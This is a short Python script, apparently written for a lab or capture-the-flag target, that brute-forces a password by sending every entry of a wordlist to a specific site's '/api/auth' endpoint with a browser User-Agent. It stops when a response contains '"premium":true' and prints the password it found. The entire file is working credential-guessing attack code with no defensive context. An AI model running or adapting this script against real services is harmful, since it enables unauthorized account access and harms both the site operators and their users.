import requests
import time
host = "http://blogger2-hithqkdsnvhtw.hexbirch.com/api/auth"
numberoflines = 0
headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "application/json, text/plain, */*",
    }
start = time.time()
with open("wordlist.txt", "r") as f:
    for line in f:
        password = line.strip()
        numberoflines += 1

        payload = {
            "password": password
        }

        response = requests.post(host, headers=headers, json=payload)

        if '"premium":true' in response.text:
            end = time.time()
            print(f"[{numberoflines}] !!!Password is valid!! :) --> " + password)
            print("The time of execution of above program is :", (end - start) * (10 ** 3) / 1000, "seconds")
            break
        else:
            print(f"[{numberoflines}] Password not valid :( --> " + password)
